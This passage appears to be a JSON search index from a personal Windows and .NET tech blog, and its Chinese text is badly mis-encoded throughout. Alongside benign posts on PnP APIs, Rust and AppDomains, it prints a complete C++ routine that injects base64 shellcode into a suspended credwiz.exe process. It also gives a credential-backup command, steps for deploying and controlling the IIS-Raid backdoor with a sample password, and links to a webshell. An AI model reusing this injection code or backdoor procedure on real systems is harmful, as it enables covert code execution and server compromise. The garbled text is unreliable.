&amp;deviceInfoData, buffer, sizeof(buffer) / sizeof(buffer[0]), &amp;requiredSize ); if (result) &#123; deviceInstanceId = buffer; &#125; return result != 0;&#125;","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"Windows\\API","slug":"Windows-API","permalink":"https://hodlyounger.github.io/tags/Windows-API/"},{"name":"Windows\\PnP","slug":"Windows-PnP","permalink":"https://hodlyounger.github.io/tags/Windows-PnP/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"PnP","slug":"A-OS/Windows/PnP","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/PnP/"}]},{"title":"ã€Rustã€‘CodeCollection","date":"2024-08-07T10:07:28.397Z","path":"B_Code/Rust/ã€Rustã€‘CodeCollect/","text":"æ¦‚è¿°ï¼šRust ä»£ç æ•´ç† æ‰“å°ç±»å‹1234// Get the type of given variable, return a string representation of the type , e.g &quot;i8&quot;, &quot;u8&quot;, &quot;i32&quot;, &quot;u32&quot;fn type_of&lt;T&gt;(_: &amp;T) -&gt; String &#123; format!(&quot;&#123;&#125;&quot;, std::any::type_name::&lt;T&gt;())&#125;","tags":[{"name":"Code/Rust","slug":"Code-Rust","permalink":"https://hodlyounger.github.io/tags/Code-Rust/"},{"name":"Rust","slug":"Rust","permalink":"https://hodlyounger.github.io/tags/Rust/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Rust","slug":"B-Code/Rust","permalink":"https://hodlyounger.github.io/categories/B-Code/Rust/"}]},{"title":"ã€å·¥å…·ã€‘ç»™æ–‡ä»¶å¤¹è®¾ç½®Icon","date":"2024-08-06T16:00:00.000Z","path":"A_OS/Windows/å·¥å…·/ã€å·¥å…·ã€‘ç»™æ–‡ä»¶å¤¹è®¾ç½®Icon/","text":"æ¦‚è¿°ï¼šå¦‚ä½•ç»™æ–‡ä»¶å¤¹ã€Uç›˜æ–‡ä»¶å¤¹è®¾ç½®Icon åˆ›å»º desktop.ini åœ¨æ–‡ä»¶ç›®å½•å†…åˆ›å»º desktop.ini æ–‡ä»¶ï¼Œå¹¶è¾“å…¥ä»¥ä¸‹å†…å®¹ 12[.ShellClassInfo]IconResource=G:\\Icon\\document.ico,0 # IconResource ä¸º icon è·¯å¾„ï¼Œä¹Ÿå¯ä»¥å¡«ç›¸å¯¹è·¯å¾„ æ·»åŠ å±æ€§ desktop æ·»åŠ  ç³»ç»Ÿï¼ˆSystemï¼‰å’Œéšè—ï¼ˆHiddenï¼‰å±æ€§ 1attrib +s +h desktop.ini ç»™æ–‡ä»¶å¤¹æ·»åŠ  ç³»ç»Ÿï¼ˆSystemï¼‰ å±æ€§ 1attrib +s æ–‡ä»¶å¤¹ ä»¥ä¸Šå°±æ˜¯å…¨éƒ¨æ­¥éª¤ï¼","tags":[{"name":"Tools","slug":"Tools","permalink":"https://hodlyounger.github.io/tags/Tools/"},{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"ä¸ªæ€§åŒ–","slug":"ä¸ªæ€§åŒ–","permalink":"https://hodlyounger.github.io/tags/%E4%B8%AA%E6%80%A7%E5%8C%96/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å·¥å…·","slug":"A-OS/Windows/å·¥å…·","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%B7%A5%E5%85%B7/"}]},{"title":"ã€WinFileã€‘credwiz.exe","date":"2024-07-22T10:26:05.744Z","path":"A_OS/Windows/Windows æ–‡ä»¶/ã€WinFileã€‘credwiz/","text":"æ¦‚è¿°ï¼šWindows credwiz.exe æ–‡ä»¶è¯´æ˜ã€‚æœ¬æ–‡ä¸»è¦è¯´æ˜å…¶åŸºæœ¬åŠŸèƒ½å’Œè¢«ä½¿ç”¨åœºæ™¯ã€‚ ç›¸å…³æ–‡ç« æ¨èï¼š credwiz.exe æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªç¨‹åºï¼Œç”¨äºå¤‡ä»½å’Œè¿˜åŸç”¨æˆ·å‡­æ®ã€‚å‡­æ®å¯ä»¥åŒ…æ‹¬ä¿å­˜çš„å¯†ç ã€è¯ä¹¦ã€è®¿é—®ä»¤ç‰Œç­‰ä¿¡æ¯ã€‚ä½¿ç”¨å‡­æ®å‘å¯¼ï¼ˆCredential Backup and Restore Wizardï¼‰å¯ä»¥å¸®åŠ©ç”¨æˆ·åœ¨éœ€è¦æ—¶è½»æ¾åœ°å¤‡ä»½å’Œæ¢å¤è¿™äº›é‡è¦çš„å‡­æ® - suv789 - åšå®¢å›­ åˆ©ç”¨IISçš„æ¨¡å—åŠŸèƒ½ç»•è¿‡é˜²ç«å¢™ credwiz.exe æ˜¯ä»€ä¹ˆ credwisz.exe æ˜¯ä¸€ä¸ªä¸ Windows Credential Manager ç›¸å…³è”çš„æ–‡ä»¶ï¼Œè¯¥åŠŸèƒ½å…è®¸ç”¨æˆ·å®‰å…¨åœ°å­˜å‚¨å’Œç®¡ç†ç”¨æˆ·å‡­è¯ï¼Œå¦‚ç”¨æˆ·åå’Œå¯†ç ã€‚ å¯åŠ¨åï¼Œcredwiz.exe æ‰“å¼€ Windows å‡­æ®ç®¡ç†å™¨ï¼Œå…è®¸ç”¨æˆ·æŸ¥çœ‹ã€æ·»åŠ æˆ–å¤‡ä»½ã€æ¢å¤æˆ–åˆ é™¤å„ç§åº”ç”¨ç¨‹åºå’Œç½‘ç«™çš„å­˜å‚¨å‡­æ®ã€‚ credwiz.exe åˆ©ç”¨ äº†è§£åˆ° Credwiz.exe å¯ä»¥å¤‡ä»½ç”¨æˆ·è´¦æˆ·å‡­è¯ï¼Œå°±ä¸éš¾æƒ³è±¡å…¶å¯èƒ½ä¼šè¢«åˆ©ç”¨çš„åœºæ™¯ã€‚ åœ¨å¾ˆå¤š Windows åé—¨æ¨¡å—ä¸­ï¼Œå°±æœ‰è°ƒç”¨ Credwiz æ¥å¤‡ä»½ç”¨æˆ·è´¦æˆ·å‡­è¯çš„åœºæ™¯ã€‚ 12# ä½¿ç”¨ credwiz.exe å¤‡ä»½å‡­æ®Start-Process -FilePath &quot;C:\\Windows\\System32\\credwiz.exe&quot; -ArgumentList &quot;/backup&quot; -Wait ä»¥åŠè¢«ç”¨æ¥æ³¨å…¥ ShellCodeã€‚Credwiz æ˜¯ Windows çš„ä¸€ä¸ªåˆæ³•è¿›ç¨‹ï¼Œæ‹¥æœ‰è¾ƒé«˜æƒé™ï¼Œå®¹æ˜“è¢«åˆ©ç”¨ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546VOID InjectShellcode(OUT LPVOID lpOutputData, IN LPVOID lpInputData) &#123; DWORD dwB64Size = MAX_DATA; STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); BOOL bSuccess = CreateProcess(L&quot;C:\\\\Windows\\\\System32\\\\credwiz.exe&quot;, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi); // Allocate space for shellcode. LPVOID lpShellcode = VirtualAllocEx(pi.hProcess, NULL, MAX_DATA, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); LPVOID lpTemp = VirtualAlloc(NULL, MAX_DATA, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); DWORD dwB64 = 4096; CryptStringToBinaryA((LPCSTR)lpInputData, 0, CRYPT_STRING_BASE64, (BYTE*)lpTemp, &amp;dwB64, NULL, NULL); SIZE_T dwWritten = 0; WriteProcessMemory(pi.hProcess, lpShellcode, lpTemp, MAX_DATA, &amp;dwWritten); CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL; GetThreadContext(pi.hThread, &amp;ctx);#ifdef _WIN64 ctx.Rip = (DWORD64)lpShellcode;#else ctx.Eip = (DWORD64)lpShellcode;#endif SetThreadContext(pi.hThread, &amp;ctx); ResumeThread(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); VirtualFree(lpTemp, MAX_DATA, MEM_DECOMMIT); CopyMemory(lpOutputData, &quot;DONE&quot; ,4);&#125; ä¸Šè¿° shellcode å¯èƒ½è¢«ç”¨æ¥åŠ è½½ä¸€äº›æ¶æ„ dllï¼Œå®ç°æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Windows æ–‡ä»¶","slug":"A-OS/Windows/Windows-æ–‡ä»¶","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Windows-%E6%96%87%E4%BB%B6/"}]},{"title":"ã€å¼±å¯†ç ã€‘Windows å¼±å¯†ç ","date":"2024-07-21T16:00:00.000Z","path":"wiki/å¼±å¯†ç /ã€å¼±å¯†ç ã€‘Windows å¼±å¯†ç /","text":"æ¦‚è¿°ï¼šWindows å¼±å¯†ç æ¢ç´¢ [toc] æ–‡ç« æ¨è 3gstudent/Hook-PasswordChangeNotify: Stealing passwords every time they change Windows åŸŸæ¸—é€ï¼Œé€šè¿‡IISæ¨¡å—ç­‰åé—¨æ–¹å¼è¢«æ‰§è¡Œï¼Œå¯ä»¥åœ¨ Windows ç”¨æˆ·ä¿®æ”¹å¯†ç æ—¶æŠ“å–ç”¨æˆ·å¯†ç ã€‚","tags":[],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"å¼±å¯†ç ","slug":"wiki/å¼±å¯†ç ","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%BC%B1%E5%AF%86%E7%A0%81/"}]},{"title":"IIS æ¼æ´å¯¼è¯»","date":"2024-07-19T02:37:22.462Z","path":"A_å†…åŠŸ/A_POCæ¢ç´¢/IIS/ã€IISã€‘å¯¼è¯»/","text":"æ¦‚è¿°ï¼šIIS ç›¸å…³çš„æ–‡ç« ã€æ¼æ´ç­‰ Backdoor ç›¸å…³æ–‡ç«  ä»é›¶åˆ°ä¸€å¼€å‘ä¸€ä¸ªexchangeåé—¨ - Gr3yyâ€™s Blog Github Repo: 0x09AL/IIS-Raid: A native backdoor module for Microsoft IIS (Internet Information Services) How to Make an ISAPI Redirection Filter - CodeProject ä»HTTPåˆ°RCEã€‚å¦‚ä½•åœ¨ IIS ä¸­ç•™ä¸‹åé—¨ / Sudo Null IT æ–°é—» Sessionmanage backdoor The SessionManager IIS backdoor: a possibly overlooked GELSEMIUM artefact | Securelist ä¸»è¦ä»‹ç»äº† SessionManager åé—¨çš„ç‰¹å¾å·²ç»å…¶ä»–ç»†èŠ‚ SessionManager IIS åé—¨ - å˜¶å¼ RoarTalk â€“ ç½‘ç»œå®‰å…¨è¡Œä¸šç»¼åˆæœåŠ¡å¹³å°,4hou.com ISAPI Redirection Filter https://stackoverflow.com/a/7232613/21595920 é‡å®šå‘ IIS çš„æµé‡ï¼Œå¯ä»¥ä» HTMLã€ASP(æˆ–å…¶ä»–è„šæœ¬å¼•æ“)å’ŒISAPI ä¸­å®šå‘ã€‚ åˆ©ç”¨IISçš„æ¨¡å—åŠŸèƒ½ç»•è¿‡é˜²ç«å¢™","tags":[],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POCæ¢ç´¢","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"IIS","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢/IIS","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/IIS/"}]},{"title":"ã€IISã€‘IIS-Raid åé—¨æ¨¡å—ä½¿ç”¨","date":"2024-07-17T07:25:26.989Z","path":"A_OS/Windows/IIS/ã€IISã€‘IIS-Raid/","text":"æ¦‚è¿°ï¼šIIS åé—¨ IIS-Raid æ¨¡å—ç›¸å…³å†…å®¹ Githubï¼šIIS Raid â€“ Backdooring IIS Using Native Modules - MDSec Docs: https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/ IIS Raid ç¼–è¯‘åŠä½¿ç”¨ Clone åˆ°æœ¬åœ°åç¼–è¯‘ X64 Release ç‰ˆæœ¬ï¼Œå°†äº§ç‰©æ‹·è´åˆ°ç›®æ ‡æœºå™¨ï¼Œç„¶ååœ¨ IIS-Manager GUI ç•Œé¢å¯¼å…¥æ¨¡å—ã€‚ å‘èµ·è¯·æ±‚ 12# python iis_controller.py --url http://&#123;IP&#125;:&#123;Port&#125;/ --password &quot;å¯†ç &quot;python iis_controller.py --url http://192.168.19.137:8080/ --password Admin@Qwe1","tags":[{"name":"IIS","slug":"IIS","permalink":"https://hodlyounger.github.io/tags/IIS/"},{"name":"Backdoor","slug":"Backdoor","permalink":"https://hodlyounger.github.io/tags/Backdoor/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"IIS","slug":"A-OS/Windows/IIS","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/IIS/"}]},{"title":"ã€.Netã€‘ä»£ç†","date":"2024-07-16T16:00:00.000Z","path":"B_Code/CSharp/ã€.Netã€‘ä»£ç†/","text":"æ¦‚è¿°ï¼š.Net è¿œç¨‹ä»£ç†çš„ä½¿ç”¨ ä»¥ä¸‹ Demo æ¼”ç¤ºå¦‚ä½•åœ¨ .Net è·¨ AppDomain æƒ…å†µä¸‹é€šè¿‡ä»£ç†çš„æ–¹å¼åˆ›å»ºå¯¹è±¡ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970public class TestProxy : RealProxy&#123; private IEngineProxy _target; public TestProxy(Type classToProxy, IEngineProxy target) : base(classToProxy) &#123; _target = target; &#125; public override IMessage Invoke(IMessage msg) &#123; var methodCall = (IMethodCallMessage)msg; var method = (MethodInfo)methodCall.MethodBase; try &#123; Console.WriteLine(&quot;Before invoke: &quot; + method.Name); var result = method.Invoke(_target, methodCall.InArgs); Console.WriteLine(&quot;After invoke: &quot; + method.Name); return new ReturnMessage(result, null, 0, methodCall.LogicalCallContext, methodCall); &#125; catch (Exception e) &#123; Console.WriteLine(&quot;Exception: &quot; + e); if (e is TargetInvocationException &amp;&amp; e.InnerException != null) &#123; return new ReturnMessage(e.InnerException, msg as IMethodCallMessage); &#125; return new ReturnMessage(e, msg as IMethodCallMessage); &#125; &#125;&#125;public class MyRealProxy&lt;T&gt; : RealProxy where T : class&#123; private T _target; public MyRealProxy(T target) : base(typeof(T)) &#123; _target = target; &#125; public static T Create(T instance) &#123; return (T)new MyRealProxy&lt;T&gt;(instance).GetTransparentProxy(); &#125; public override IMessage Invoke(IMessage msg) &#123; try &#123; IMethodCallMessage call = msg as IMethodCallMessage; var args = call.Args; var interfaces = call.GetType().GetInterfaces(); object returnValue = typeof(MarshaleLoader).InvokeMember(call.MethodName, BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Instance, null, _target, args); return new ReturnMessage(returnValue, args, args.Length, call.LogicalCallContext, call); &#125; catch (Exception e) &#123; throw e; &#125; &#125;&#125;","tags":[{"name":"DotNet","slug":"DotNet","permalink":"https://hodlyounger.github.io/tags/DotNet/"},{"name":"Code/CSharp","slug":"Code-CSharp","permalink":"https://hodlyounger.github.io/tags/Code-CSharp/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CSharp","slug":"B-Code/CSharp","permalink":"https://hodlyounger.github.io/categories/B-Code/CSharp/"}]},{"title":"ã€ç¯å¢ƒæ­å»ºã€‘IIS","date":"2024-07-16T16:00:00.000Z","path":"A_OS/Windows/ç¯å¢ƒæ­å»º/ã€ç¯å¢ƒæ­å»ºã€‘IIS/","text":"æ¦‚è¿°ï¼šWindows IIS ç¯å¢ƒæ­å»º å‚è€ƒé“¾æ¥ï¼šhttps://www.cnblogs.com/taylorshi/p/15768620.html http://wiki.corp.qihoo.net/pages/viewpage.action?pageId=140215807 æ§åˆ¶é¢æ¿â€“&gt;ç¨‹åºâ€“&gt;æ‰“å¼€æˆ–å…³é—­windowåŠŸèƒ½â€“&gt;å‹¾é€‰IISç›¸å…³é€‰é¡¹â€“&gt;ç¡®å®š é‡å¯ç³»ç»Ÿåï¼Œæ§åˆ¶é¢æ¿â€“&gt;ç³»ç»Ÿå’Œå®‰å…¨â€“&gt;ç®¡ç†å·¥å…·ï¼Œå¯ä»¥çœ‹åˆ°IISç®¡ç†å™¨ å®‰è£…éœ€è¦çš„.netç‰ˆæœ¬ï¼ˆè¿™é‡Œéœ€è¦å®‰è£….net4.0ç‰ˆæœ¬ï¼Œåé¢ä¼šä¾èµ–æ­¤.netï¼Œå¦‚ndp48-devpack-enu.exeï¼‰ è§£å‹testweb.zipï¼Œåé¢æ·»åŠ ç½‘å€æ—¶é€‰æ‹©è·¯å¾„éœ€è¦ åŒå‡»æ‰“å¼€Internet ä¿¡æ¯æœåŠ¡(IIS)ç®¡ç†å™¨ï¼Œå³é”®ç½‘ç«™â€“æ·»åŠ ç½‘ç«™ï¼Œåç§°éšä¾¿å†™ï¼Œç‰©ç†è·¯å¾„å°±æ˜¯ä¸Šé¢è§£å‹åçš„è·¯å¾„ï¼Œç«¯å£éœ€è¦æ”¹æˆ8080ï¼Œè¦ä¸æç¤ºè¢«å ç”¨ ç‚¹å‡»â€˜åº”ç”¨ç¨‹åºæ± â€™ï¼Œæ‰¾åˆ°åˆšæ‰å»ºçš„ç½‘ç«™ï¼Œå³é”®é«˜çº§è®¾ç½®ã€‚éœ€è¦ä¸‹é¢ä¸¤ä¸ªåœ°æ–¹ è®¾ç½®é»˜è®¤èµ·å§‹é¡µ æµè§ˆç½‘ç«™ å¤‡æ³¨ï¼šç»™çš„WebForm1.aspxæµ‹è¯•ç¨‹åºä¸ä¸¥è°¨ï¼Œæ¯”å¦‚ 1ã€ä¸Šä¼ åˆ°imagesç›®å½•å†™æ­»äº†ï¼Œå¦‚æœç›®å½•ä¸å­˜åœ¨ä¼šæŠ¥é”™ 2ã€ä¸Šä¼ çš„æ–‡ä»¶åè¿›è¡Œäº†è„±å¯†å¤„ç†ï¼Œé‡å‘½åä¸ºéšæœºæ•°ï¼Œè¿™æ ·æ— æ³•éªŒè¯ä¸­æ–‡æˆ–è€…ç‰¹æ®Šå­—ç¬¦ æ‰€ä»¥ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™ä¸ªwebshellæµ‹è¯•ï¼Œå°†å…¶ä¸‹è½½åé‡å‘½åä¸ºWebForm1.aspxå°±è¡Œ https://github.com/xl7dev/WebShell/blob/master/Aspx/fileupload.aspx Authkey:woanware","tags":[{"name":"IIS","slug":"IIS","permalink":"https://hodlyounger.github.io/tags/IIS/"},{"name":"ç¯å¢ƒæ­å»º","slug":"ç¯å¢ƒæ­å»º","permalink":"https://hodlyounger.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç¯å¢ƒæ­å»º","slug":"A-OS/Windows/ç¯å¢ƒæ­å»º","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"ã€.Netã€‘AppDomain","date":"2024-07-06T16:00:00.000Z","path":"B_Code/CSharp/ã€.Netã€‘AppDomain/","text":"é˜…è¯»è¿™ç¯‡æ–‡ç« ä½ ä¼šäº†è§£åˆ°ï¼š AppDomain æ˜¯ä»€ä¹ˆ SystemDomainã€SharedDomainã€DefaultDomain å¦‚ä½•åˆ›å»º AppDomain å¦‚ä½•è·¨ AppDomain åŠ è½½ç¨‹åºé›†å¹¶è°ƒç”¨æŒ‡å®šæ¥å£ ç›¸å…³æ–‡ç« ï¼š The Truth About .NET Objects And Sharing Them Between AppDomains - Geeks with Blogs AppDomain &amp; Assembly åº”ç”¨ç¨‹åºåŸŸæ˜¯ .NET ä¸­ç”¨äºæä¾›éš”ç¦»çš„æ‰§è¡Œç¯å¢ƒçš„ä¸€ä¸ªæ¦‚å¿µï¼Œå®ƒå…è®¸åœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­è¿è¡Œå¤šä¸ªåº”ç”¨ç¨‹åºåŸŸï¼Œæ¯ä¸ªåº”ç”¨ç¨‹åºåŸŸéƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ä»£ç ã€æ•°æ®å’Œé…ç½®ã€‚åº”ç”¨ç¨‹åºåŸŸä¹‹é—´æ˜¯ç›¸äº’éš”ç¦»çš„ï¼Œè¿™ç§éš”ç¦»æä¾›äº†æ›´é«˜çš„å®‰å…¨æ€§å’Œç¨³å®šæ€§ï¼Œå¹¶å…è®¸åŠ¨æ€åŠ è½½å’Œå¸è½½ç¨‹åºé›†ã€‚ å…³äº AppDomain æˆ‘çš„ç†è§£æ˜¯ï¼Œå¯ä»¥å‚è€ƒç³»ç»Ÿå’Œè¿›ç¨‹ã€‚ä¸€ä¸ªç³»ç»Ÿç”±å¤šä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ªAppDomainã€‚AppDomain ä¹‹é—´ä¹Ÿå’Œè¿›ç¨‹ä¸€æ ·æ˜¯éš”ç¦»çš„ã€‚ä½†ä¸åŒçš„æ˜¯ï¼ŒAppDomain åˆå¤§è‡´åˆ†ä¸ºä¸‰ç±»ï¼ŒSystemDomainã€ShreadDomainã€DefaultDomain å®˜æ–¹å¹¶æ²¡æœ‰å¯¹è¿™ä¸‰ä¸ª AppDomain è¿›è¡Œè¯´æ˜ã€‚è¿™é‡Œæˆ‘å°±ä¸ªäººç†è§£è¯´æ˜ä¸€ä¸‹ï¼š ç”¨ Windbg è°ƒè¯•å¯ä»¥ä½¿ç”¨ !DumpDomain æŸ¥çœ‹åŸŸä¿¡æ¯ï¼Œå¯ä»¥è½¬å‚¨ä¸€ä¸ª w3wp çš„ dump è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ã€‚è¿™é‡Œä»¥ w3wp ä¸ºä¾‹ã€‚ SystemDomain: æè¿°: SystemDomain æ˜¯ .NET è¿è¡Œæ—¶å¯åŠ¨æ—¶åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåº”ç”¨ç¨‹åºåŸŸã€‚å®ƒä¸»è¦ç”¨äºåŠ è½½å’Œæ‰§è¡Œä¸ .NET è¿è¡Œæ—¶è‡ªèº«ç›¸å…³çš„æ ¸å¿ƒåº“å’Œä»£ç ï¼Œå¦‚ mscorlib.dllï¼Œè¯¥åº“åŒ…å«äº† .NET Framework çš„åŸºæœ¬ç±»ã€‚ åŠŸèƒ½: ç®¡ç† .NET è¿è¡Œæ—¶çš„å¯åŠ¨å’Œåˆå§‹åŒ–ã€‚ åŠ è½½å’Œæ‰§è¡Œ .NET è¿è¡Œæ—¶çš„æ ¸å¿ƒç»„ä»¶ã€‚ æä¾›ä¸€ä¸ªå®‰å…¨çš„éš”ç¦»ç¯å¢ƒï¼Œä»¥ç¡®ä¿ .NET è¿è¡Œæ—¶çš„ç¨³å®šæ€§ã€‚ SharedDomain: æè¿°: SharedDomain æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„åº”ç”¨ç¨‹åºåŸŸï¼Œç”¨äºå…±äº« .NET è¿è¡Œæ—¶ä¸­æŸäº›å…¨å±€é™æ€æ•°æ®ã€‚è¿™ä¸ªåŸŸé€šå¸¸ç”¨äºæ‰˜ç®¡å…¨å±€çš„å’Œé€šç”¨çš„ç±»å‹ï¼Œä¾‹å¦‚å…±äº«ç±»å‹å’Œé™æ€å­—æ®µï¼Œä»¥å‡å°‘å†…å­˜ä½¿ç”¨å’Œæé«˜æ€§èƒ½ã€‚ åŠŸèƒ½: æä¾›ä¸€ä¸ªå…¨å±€å…±äº«çš„åŒºåŸŸï¼Œç”¨äºå­˜å‚¨å…±äº«çš„é™æ€æ•°æ®å’Œç±»å‹ã€‚ ä¼˜åŒ–å†…å­˜ä½¿ç”¨å’Œæ€§èƒ½ï¼Œé€šè¿‡å‡å°‘å†—ä½™çš„é™æ€æ•°æ®ã€‚ DefaultDomain: ã€‹DefaultDomain1: DefaultDomain ã€‹ DefaultDomain2ï¼š æè¿°: DefaultDomain æ˜¯åœ¨ .NET è¿è¡Œæ—¶å¯åŠ¨ä¹‹ååˆ›å»ºçš„ç¬¬ä¸€ä¸ªåº”ç”¨ç¨‹åºåŸŸï¼Œç”¨äºåŠ è½½å¹¶æ‰§è¡Œåº”ç”¨ç¨‹åºä»£ç ã€‚æ¯ä¸ª .NET è¿›ç¨‹å¯åŠ¨æ—¶ï¼Œéƒ½ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ª DefaultDomainã€‚ åŠŸèƒ½: åŠ è½½å¹¶æ‰§è¡Œåº”ç”¨ç¨‹åºä»£ç ã€‚ æä¾›ä¸€ä¸ªéš”ç¦»çš„æ‰§è¡Œç¯å¢ƒï¼Œç”¨äºæ‰˜ç®¡åº”ç”¨ç¨‹åºçš„ä»£ç å’Œèµ„æºã€‚ æ”¯æŒè·¨åº”ç”¨ç¨‹åºåŸŸçš„ä»£ç å’Œèµ„æºéš”ç¦»ï¼Œæé«˜å®‰å…¨æ€§å’Œç¨³å®šæ€§ã€‚ åœ¨AppDomainä¸­è°ƒç”¨ æ–¹æ³•ä¸€ï¼š 1234567891011121314151617181920212223public class SimpleAssemblyLoader : MarshalByRefObject&#123; public void Load(string path) &#123; ValidatePath(path); Assembly.Load(path); &#125; public void LoadFrom(string path) &#123; ValidatePath(path); Assembly.LoadFrom(path); &#125; private void ValidatePath(string path) &#123; if (path == null) throw new ArgumentNullException(&quot;path&quot;); if (!System.IO.File.Exists(path)) throw new ArgumentException(String.Format(&quot;path \\&quot;&#123;0&#125;\\&quot; does not exist&quot;, path)); &#125;&#125; æ–¹æ³•äºŒï¼š 1234567891011121314151617181920212223public class SimpleAssemblyLoader : MarshalByRefObject&#123; public void Load(string path) &#123; ValidatePath(path); Assembly.Load(path); &#125; public void LoadFrom(string path) &#123; ValidatePath(path); Assembly.LoadFrom(path); &#125; private void ValidatePath(string path) &#123; if (path == null) throw new ArgumentNullException(&quot;path&quot;); if (!System.IO.File.Exists(path)) throw new ArgumentException(String.Format(&quot;path \\&quot;&#123;0&#125;\\&quot; does not exist&quot;, path)); &#125;&#125; å¦‚ä½•ä½¿ç”¨ï¼š 123456Type proxyType = typeof(Sandboxer);MarshalByRefObject proxy = (MarshalByRefObject)domain. CreateInstanceFrom( proxyType.Assembly.Location, proxyType.FullName).Unwrap(); JIT On Another AppDomain 123456789101112131415161718192021222324252627282930313233343536373839 ObjectHandle handle = Activator.CreateInstanceFrom( domain, typeof(Process).Assembly.ManifestModule.FullyQualifiedName, typeof(Process).FullName ); //TODO å°è¯• JIT ObjectHandle handle1 = domain.CreateInstanceFrom( typeof(Process).Assembly.ManifestModule.FullyQualifiedName, typeof(Process).FullName ); Process DomainProcess = (Process)handle.Unwrap(); var Methods = DomainProcess.GetType().GetRuntimeMethods().ToList(); var StartWithCreateProcess = Methods.Where(_ =&gt; _.Name == &quot;StartWithShellExecuteEx&quot;).FirstOrDefault(); var StartWithShellExecuteEx = Methods.Where(_ =&gt; _.Name == &quot;StartWithCreateProcess&quot;).FirstOrDefault(); var methodhandle = StartWithCreateProcess.MethodHandle; var methodAttr = StartWithCreateProcess.Attributes; var methodType = methodhandle.GetType();if(false) &#123; try &#123; StartWithCreateProcess.Invoke(null, null); StartWithShellExecuteEx.Invoke(null, null); &#125; catch (Exception ex) &#123; int error = Marshal.GetLastWin32Error(); Natives.OutputDebug(ex.StackTrace + $&quot;error:&#123;error&#125;, &quot; + ex.Message); &#125; &#125; // RuntimeHelpers.PrepareMethod(StartWithShellExecuteEx); if (!((methodAttr &amp; MethodAttributes.Abstract) == MethodAttributes.Abstract || methodType.ContainsGenericParameters)) &#123; RuntimeHelpers.PrepareMethod(methodhandle); &#125; methodhandle = StartWithCreateProcess.MethodHandle; åˆ›å»º AppDomain å¹¶ä¼ é€’æ•°æ® å¦‚ä¸‹æ‰€ç¤ºï¼Œå¾ªç¯åˆ›å»º AppDomain å¹¶ä¼ é€’æ•°æ®åˆ°æ‰€åˆ›å»ºçš„ AppDomain ä¸­ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Program &#123; /// &lt;summary&gt; /// Show how to pass an object by reference directly into another appdomain /// without serializing it at all. /// &lt;/summary&gt; /// &lt;param name=&quot;args&quot;&gt;&lt;/param&gt; [LoaderOptimization(LoaderOptimization.MultiDomainHost)] static public void Main(string[] args) &#123; for (int i = 